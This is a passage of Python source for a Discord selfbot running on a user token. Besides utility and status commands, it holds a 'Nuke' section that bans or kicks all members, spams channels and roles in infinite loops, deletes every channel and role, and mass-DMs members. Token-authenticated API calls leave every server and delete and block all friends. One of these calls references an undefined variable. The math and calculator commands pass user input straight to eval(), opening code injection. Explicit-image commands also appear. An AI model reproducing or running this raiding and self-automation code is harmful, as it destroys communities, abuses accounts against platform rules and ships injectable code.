  await msg.edit(content=f"🏓Pong! {round(client.latency * 1000)}ms")
  
@client.command()
async def info(ctx):
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0))
      embed.set_author(name=f"{ctx.author}'s Info!",icon_url=ctx.author.avatar_url)
      embed.set_thumbnail(url=ctx.author.avatar_url)
      embed.add_field(name="**Username:**",value=client.user.name,inline=False)
      embed.add_field(name="**ID:**",value=client.user.id,inline=False)
      embed.add_field(name="**Servers:**",value=f"{len(client.guilds)}",inline=False)
      await ctx.send(embed=embed)
  except:
      await ctx.send(f"""**__{ctx.author}'s Info!__**
      
**Username:**
`{client.user.name}`

**ID:**
`{client.user.id}`

**Servers:**
`{len(client.guilds)}`

**Avatar URL**
`{client.user.avatar_url}`""")

@client.command()
async def tts(ctx, lang, *, text: str):
    await ctx.message.delete()
    tts = gTTS(text, lang=lang)
    filename = f'funny.mp3'
    tts.save(filename)
    await ctx.send(file=discord.File(fp=filename, filename=filename))
    if os.path.exists(filename):
        os.remove(filename)

@client.command()
async def dumpemojis(ctx, server_id: int=None):
        await ctx.message.delete()
        try:
            if server_id is None:
                server = ctx.guild
            else: 
                server = discord.utils.get(ctx.bot.guilds, id=server_id)
            
            emojiNum = len(server.emojis)

            folderName = 'Emojis/' + server.name.translate({ord(c): None for c in '/<>:"\\|?*'})

            if emojiNum > 0:
                if not os.path.exists(folderName):
                    os.makedirs(folderName)
            for emoji in server.emojis:

                if emoji.animated:
                    fileName = folderName + '/' + emoji.name + '.gif'

                else:
                    fileName = folderName + '/' + emoji.name + '.png'

                if not os.path.exists(fileName):
                    with open(fileName, 'wb') as outFile:
                        req = urllib.request.Request(emoji.url, headers={'user-agent': 'Mozilla/5.0'})
                        data = urllib.request.urlopen(req).read()
                        outFile.write(data)
        except:
            pass

# Status

@client.command()
async def game(ctx, *, x):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Game(name=x))
  
@client.command()
async def stream(ctx, *, x):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Streaming(name=x, url="https://twitch.tv/ulxywulxy"))
  
@client.command()
async def listen(ctx, *, x):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=x))

@client.command()
async def watch(ctx, *, x):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=x))

@client.command()
async def clear(ctx):
  await ctx.message.delete()
  await client.change_presence(status=discord.Status.dnd)

# Nuke

@client.command()
async def ball(ctx):


        members = ctx.channel.members
        for member in members:
            if member is not ctx.author:
                try:
                    await member.ban()
                except Exception:
                    pass
      
@client.command()
async def kall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick()
            print(f"{Fore.GREEN} Kicked {member}")
        except:
            print(f"{Fore.GREEN} Can't Kick {member}")
        continue

@client.command()
async def schan(ctx, *, x):
    await ctx.message.delete()
    while True:
        await ctx.guild.create_text_channel(name=x)
        
@client.command()
async def srole(ctx, *, x):
    await ctx.message.delete()
    while True:
        await ctx.guild.create_role(name=x)
        
@client.command()
async def dchan(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted {channel}")
        except:
            print(f"Can't Delete {channel}")
            continue
        
@client.command()
async def drole(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"Deleted {role}")
        except:
            print(f"Can't Delete {role}")
        continue

@client.command()
async def roles(ctx):
    await ctx.message.delete()
    try:
        roles = [role for role in ctx.guild.roles[::-1]]
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        embed.add_field(name="**Server Roles:**",value="\n".join([role.name for role in roles]))
        await ctx.send(embed=embed)
    except:
        await ctx.send("""**__Server Roles:__**\n""" + "\n".join([role.name for role in roles]))

# Personal

@client.command()
async def guilds(ctx):
    await ctx.message.delete()
    try:
        guilds = [guild for guild in client.guilds]
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        embed.add_field(name="**GuildCount:**",value=f"{len(client.guilds)}",inline=False)
        embed.add_field(name="**Guild Names:**",value="\n".join([guild.name for guild in guilds]))
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**GuildCount:**
{len(client.guilds)}
**Guild Names:**\n""" + "\n".join([guild.name for guild in guilds]))

@client.command()
async def prefix(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at,description=j["prefix"])
        embed.set_author(name="PREFIX",icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**__PREFIX__**\n`""" + j["prefix"] + "`")
    
@client.command()
async def myroles(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        roles = [role for role in ctx.author.roles]
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        embed.add_field(name=f"**Roles:**",value=f"{len(ctx.author.roles)}",inline=False)
        embed.add_field(name="**Role Names:**",value="\n".join([role.name for role in roles]))
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**Roles:**\n`{len(ctx.author.roles)}`
**Role Names:**\n""" + "\n".join([role.name for role in roles]))

@client.command()
async def nick(ctx, *, x):
    await ctx.message.delete()
    await ctx.author.edit(nick=x)
    
@client.command()
async def nickreset(ctx):
    await ctx.message.delete()
    await ctx.author.edit(nick=ctx.author.name)

@client.command(aliases=['friendexport'])
async def friendbackup(ctx):
        friends = requests.get('https://canary.discordapp.com/api/v8/users/@me/relationships', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
        await ctx.message.delete()
        for friend in range(0, len(friends)):
            friend_id = friends[friend]['id']
            friend_name = friends[friend]['user']['username']
            friend_discriminator = friends[friend]['user']['discriminator']
            friendinfo = f'{friend_name}#{friend_discriminator} ({friend_id})'
            with open('Friends.txt', 'a+') as f:
                f.write(friendinfo+"\n" )

# Math

@client.command()
async def add(ctx, number1, number2):
    x = f"{number1}+{number2}"
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),description=f"Question: {number1} + {number2}\nAnswer: {eval(x)}")
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**Question:** {number1} + {number2}\n**Answer:** {eval(x)}""")
  
@client.command()
async def subtract(ctx, number1, number2):
    x = f"{number1} - {number2}"
    await ctx.message.delete()
    try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),description=f"Question: {number1} - {number2}\nAnswer: {eval(x)}")
      await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**Question:** {number1} - {number2}\n**Answer:** {eval(x)}""")

@client.command()
async def multiply(ctx, number1, number2):
    x = f"{number1}*{number2}"
    await ctx.message.delete()
    try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),description=f"Question: {number1} * {number2}\nAnswer: {eval(x)}")
      await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**Question:** {number1} * {number2}\n**Answer:** {eval(x)}""")

@client.command()
async def divide(ctx, number1, number2):
    x = f"{number1} / {number2}"
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),description=f"Question: {number1} / {number2}\nAnswer: {eval(x)}")
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**Question:** {number1} / {number2}\n**Answer:** {eval(x)}""")

@client.command()
async def calculator(ctx, *, x):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),description=f"Question: {x}\nAnswer: {eval(x)}")
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**Question:** {x}\n**Answer:** {eval(x)}""")

# Server

@client.command()
async def servericon(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0))
        embed.set_image(url=ctx.guild.icon_url)
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"{ctx.guild.icon_url}")
    
@client.command()
async def serverbanner(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0))
        embed.set_image(url=ctx.guild.banner_url)
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"{ctx.guild.banner_url}")
    
@client.command()
async def servername(ctx):
    await ctx.message.delete()
    await ctx.send(ctx.guild.name)

@client.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    try:
        roles = [role for role in ctx.guild.roles[::-1]]
        channels = [channel for channel in ctx.guild.channels[::-1]]
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        roles = [role for role in ctx.guild.roles[::-1]]
        embed.set_author(name="𝙎𝙀𝙍𝙑𝙀𝙍𝙄𝙉𝙁𝙊",icon_url=ctx.guild.icon_url)
        embed.set_thumbnail(url=ctx.guild.icon_url)
        embed.set_image(url=ctx.guild.banner_url)
        embed.add_field(name="**Server Name:**",value=f"{ctx.guild.name}",inline=False)
        embed.add_field(name="**Server ID:**",value=f"{ctx.guild.id}",inline=False)
        embed.add_field(name="**Server Owner:**",value=f"{ctx.guild.owner}",inline=False)
        embed.add_field(name="**Server Roles:**",value=f"{len(ctx.guild.roles)}",inline=False)
        embed.add_field(name="**Role Names:**",value="\n".join([role.name for role in roles]),inline=False)
        embed.add_field(name="**Server Text Channels:**",value=f"{len(ctx.guild.text_channels)}",inline=False)
        embed.add_field(name="**Server Voice Channels:**",value=f"{len(ctx.guild.voice_channels)}",inline=False)
        embed.add_field(name="**Server Categories:**",value=f"{len(ctx.guild.categories)}",inline=False)
        embed.add_field(name="**Boosts:**",value=f"{ctx.guild.premium_subscription_count}",inline=False)
        embed.add_field(name="**Members:**",value=f"{ctx.guild.member_count}",inline=False)
        await ctx.send(embed=embed)
    except:
        await ctx.send(f"""**__SERVERINFO__**
        
**Server Name:**
`{ctx.guild.name}`

**Server ID:**
`{ctx.guild.id}`

**Server Owner:**
`{ctx.guild.owner}`

**Server Roles:**
`{len(ctx.guild.roles)}`

**Server Text Channels:**
`{len(ctx.guild.text_channels)}`

**Server Voice Channels:**
`{len(ctx.guild.voice_channels)}`

**Server Categories:**
`{len(ctx.guild.categories)}`

**Boosts:**
`{ctx.guild.premium_subscription_count}`

**Members:**
`{ctx.guild.member_count}`""")

@client.command()
async def serverroles(ctx):
    await ctx.message.delete()
    try:
        roles = [role for role in ctx.guild.roles[::-1]]
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        embed.add_field(name="**Server Roles:**",value="\n".join([role.name for role in roles]))
        await ctx.send(embed=embed)
    except:
        await ctx.send("""**__Server Roles:__**\n""" + "\n".join([role.name for role in roles]))
    
@client.command()
async def serverchannels(ctx):
    await ctx.message.delete()
    try:
        channels = [channel for channel in ctx.guild.channels]
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        embed.add_field(name="**Server Channels:**",value="\n".join([channel.name for channel in channels]))
        await ctx.send(embed=embed)
    except:
        await ctx.send("""**__Server Channels:__**\n""" + "\n".join([channel.name for channel in channels]))

@client.command()
async def copy(ctx): # b'\xfc'
    await ctx.message.delete()
    await client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
            for role in ctx.guild.roles:
                name = role.name
                color = role.colour
                perms = role.permissions
                await g.create_role(name=name, permissions=perms, colour=color)

# Nsfw

@client.command()
async def hentai(ctx): 
  await ctx.message.delete()
  try:
      hentai = requests.get("https://nekos.life/api/v2/img/hentai")
      res = hentai.json()
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
      embed.set_author(name="𝙃𝙀𝙉𝙏𝘼𝙄",icon_url=ctx.author.avatar_url)
      embed.set_image(url=res["url"])
      await ctx.send(embed=embed)
  except:
      await ctx.send(res["url"])

@client.command()
async def sex(ctx):
  await ctx.message.delete()
  try:
    anal = requests.get("https://nekos.life/api/v2/img/anal")
    res = anal.json()
    embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
    embed.set_author(name="𝙎𝙀𝙓",icon_url=ctx.author.avatar_url)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)
  except:
      await ctx.send(res["url"])

@client.command()
async def tits(ctx):
  await ctx.message.delete()
  try:
    boobs = requests.get("https://nekos.life/api/v2/img/boobs")
    res = boobs.json()
    embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
    embed.set_author(name="𝙏𝙄𝙏𝙎",icon_url=ctx.author.avatar_url)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)
  except:
      await ctx.send(res["url"])

@client.command()
async def pussy(ctx):
  await ctx.message.delete()
  try:
      pussy = requests.get("https://nekos.life/api/v2/img/pussy")
      res = pussy.json()
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
      embed.set_author(name="𝙋𝙐𝙎𝙎𝙔",icon_url=ctx.author.avatar_url)
      embed.set_image(url=res["url"])
      await ctx.send(embed=embed)
  except:
      await ctx.send(res["url"])
  
@client.command()
async def dick(ctx):
  await ctx.message.delete()
  try:
    dick = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = dick.json()
    embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
    embed.set_author(name="𝘿𝙄𝘾𝙆",icon_url=ctx.author.avatar_url)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)
  except:
      await ctx.send(res["url"])

@client.command()
async def dmall(ctx, *, msg: str):
  try:
      members = ctx.channel.members
      for member in members:
          if member is not ctx.author:
              try:
                  await member.send(msg)
              except Exception:
                  pass
  except Exception:
            pass




@client.command()
async def leaveallservers(ctx):
	await ctx.message.delete()
	try:
		guilds = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
		for guild in range(0, len(guilds)):
			guild_id = guilds[guild]['id']
			requests.delete(f'https://canary.discordapp.com/api/v8/users/@me/guilds/{guild_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
	except Exception:
		pass

@client.command()
async def deleteallfriends(ctx):
        try:
            friends = requests.get('https://canary.discordapp.com/api/v8/users/@me/relationships', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
            for friend in range(0, len(friends)):
                friend_id = friends[friend]['id']
                requests.put(f'https://canary.discordapp.com/api/v8/users/@me/relationships/{friend_id}', json={'type': 2}, headers={'authorization': tokentonuke, 'user-agent': 'Mozilla/5.0'})
                requests.delete(f'https://canary.discordapp.com/api/v8/channels/{friend_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        except Exception:
            pass

client.run(token,bot=False)